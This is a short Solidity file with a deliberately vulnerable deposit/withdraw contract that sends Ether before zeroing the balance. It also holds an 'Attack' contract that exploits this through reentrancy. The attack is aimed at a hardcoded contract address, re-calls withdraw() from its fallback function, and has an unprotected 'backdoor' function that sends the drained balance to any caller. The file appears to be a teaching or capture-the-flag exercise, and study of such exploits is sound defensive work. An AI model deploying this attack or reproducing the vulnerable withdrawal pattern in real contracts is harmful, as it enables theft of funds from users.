pragma solidity ^0.5.0;
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

//0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C
contract Attack
{
 uint count;

 mapping(address => uint256) public balances;

 Vuln v = Vuln(address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C));

 function put() public payable
 {
     //require(msg.value >= 1 ether);

     //triggers fallback
     v.deposit.value(0.01 ether)();
     v.withdraw();
 }

 function take() public
 {
     v.withdraw();
 }

 function () external payable
 {
     count++;
     if(count < 4)
     {
         v.withdraw();
     }
 }

 function backdoor() public{
        msg.sender.send(address(this).balance);
    }

}
